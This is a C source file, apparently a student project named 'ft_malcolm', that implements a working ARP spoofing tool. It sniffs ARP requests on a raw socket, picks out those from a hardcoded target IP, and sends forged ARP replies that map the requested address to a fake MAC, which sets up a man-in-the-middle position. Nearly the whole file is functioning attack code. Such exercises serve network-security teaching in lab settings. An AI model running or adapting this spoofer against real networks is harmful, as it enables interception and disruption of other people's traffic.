#include "../headers/malcolm.h"

uint16_t ft_ntohs(uint16_t netshort)
{
	return swap_uint16(netshort);
}

uint16_t ft_htons(uint16_t netshort)
{
	return swap_uint16(netshort);
}

void print_ip(uint8_t *ip_address)
{
	int i = 0;

	while (i < IP_ADDR_LEN) {
		printf("%d", ip_address[i]);
		if (i < IP_ADDR_LEN-1)
			printf(".");
		i++;
	}
}

void print_mac(uint8_t *mac)
{
	int i = 0;

	while (i < ETH_ADDR_LEN) {
		printf("%02X", mac[i]);
		if (i < ETH_ADDR_LEN-1)
			printf(":");
		i++;
	}
}

void debug_arp(struct arp_hdr *arp)
{
	printf("_____ARP_____\n");

	/* Type informations */
	printf("Hardware type: %s\n",
		(ft_ntohs(arp->hrd) == HARDWARE_ETHERNET) ? "Ethernet" : "Unknown");
	printf("Protocol type: %s\n",
		(ft_ntohs(arp->pro) == ETH_P_IP) ? "IPv4" : "Unknown");
	printf("Operation: %s\n",
		(ft_ntohs(arp->op) == ARP_REQUEST) ? "ARP Request" : "ARP Reply");

	/* Addresses informations */
	/* Sender */
	printf("Sender MAC: ");
	print_mac(arp->sha);
	printf("\n");
	printf("Sender IP: ");
	print_ip(arp->sip);
	printf("\n");

	/* Target */
	printf("Target MAC: ");
	print_mac(arp->tha);
	printf("\n");
	printf("Target IP: ");
	print_ip(arp->tip);
	printf("\n");
}

void debug_eth(struct ethernet_hdr *ethernet)
{
	printf("_____ETH_____\n");

	/* Type */
	printf("Ethernet type: %s\n",
		(ft_ntohs(ethernet->type) == ETH_P_ARP) ? "ARP" : "Other");

	/* Addresses informations */
	/* Sender */
	printf("Sender MAC: ");
	print_mac(ethernet->smac);
	printf("\n");

	/* Target */
	printf("Target MAC: ");
	print_mac(ethernet->dmac);
	printf("\n");
}

void debug_packet(struct ethernet_hdr *ethernet, struct arp_hdr *arp)
{
	printf("\n");
	debug_eth(ethernet);
	debug_arp(arp);
	printf("_______________________________\n");
}

int send_back(int sockfd, struct sockaddr_ll src_addr,
	struct ethernet_hdr *ethernet, struct arp_hdr *arp)
{
	int ret;
	socklen_t addr_len = sizeof(struct sockaddr_ll);
	struct arp_packet packet = {0};

	uint8_t dest_mac[ETH_ADDR_LEN] = {0x66, 0x66, 0x66, 0x66, 0x66, 0x66};
	/* uint8_t dest_ip[IP_ADDR_LEN] = {66, 66, 66, 66}; */
	uint8_t tmp_ip[IP_ADDR_LEN] = {0};

	/* Fill the new packet */
	packet.ethernet = *ethernet;
	packet.arp = *arp;
	/* Set the ARP opcode to reply */
	packet.arp.op = ft_htons(ARP_REPLY);

	/* Changing MAC addresses */
	ft_memcpy(packet.ethernet.smac, dest_mac, sizeof(packet.ethernet.smac));
	ft_memcpy(packet.arp.tha, packet.arp.sha, sizeof(packet.arp.sha));
	ft_memcpy(packet.arp.sha, dest_mac, sizeof(packet.arp.sha));

	/* Swapping IP addresses */
	ft_memcpy(tmp_ip, packet.arp.sip, sizeof(packet.arp.sip));
	ft_memcpy(packet.arp.sip, packet.arp.tip, sizeof(packet.arp.sip));
	ft_memcpy(packet.arp.tip, tmp_ip, sizeof(packet.arp.sip));

	ret = sendto(sockfd, &packet, sizeof(struct arp_packet), 0,
		(struct sockaddr *)&src_addr, addr_len);
	printf("Wrote: %d bytes in socket\n", ret);

	return 0;
}

int filter_out(uint8_t *ip)
{
	/* 172.18.0.2 */
	/* TODO: Must take this IP from arg list (MAC address too) */
	uint8_t target_ip[IP_ADDR_LEN] = {172, 17, 0, 2};

	int i = 0;
	while (i < IP_ADDR_LEN) {
		if (target_ip[i] != ip[i])
			return 1;
		i++;
	}

	return 0;
}

void handle_packet(int sockfd, struct sockaddr_ll src_addr, char *buffer)
{
	struct arp_hdr *arp;
	struct ethernet_hdr *ethernet;
	uint16_t type;
	uint16_t opcode;

	ethernet = (struct ethernet_hdr *)buffer;
	arp = (struct arp_hdr *)(buffer + sizeof(struct ethernet_hdr));

	type = ft_ntohs(ethernet->type);
	/* TODO: Check if an OPCODE check is needed */
	opcode = ft_ntohs(arp->op);

	if (type == ETH_P_ARP && opcode == ARP_REQUEST &&
		!filter_out(arp->sip)) {
		debug_packet(ethernet, arp);
		send_back(sockfd, src_addr, ethernet, arp);
	}
	else {
		printf("Filtering request from: ");
		print_ip(arp->sip);
	}
}

int ft_malcolm(void)
{
	int sockfd;
	int len = sizeof(struct ethernet_hdr) + sizeof(struct arp_hdr);
	char buffer[len];
	int ret;
	struct sockaddr_ll src_addr;
	socklen_t addr_len = sizeof(struct sockaddr_ll);

	/* Socket creation */
	if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
		fprintf(stderr, "[!] Failed to create socket\n");
		return 1;
	}

	printf("Sniffing ARP packets...\n");
	while ((ret = recvfrom(sockfd, buffer, len, 0,
				(struct sockaddr *)&src_addr, &addr_len)) != -1) {
		if (ret > 0)
			handle_packet(sockfd, src_addr, buffer);
	}

	close(sockfd);

	return 0;
}

int main(int ac, char **av)
{
	(void)ac;
	(void)av;
	ft_malcolm();
	return 0;
}
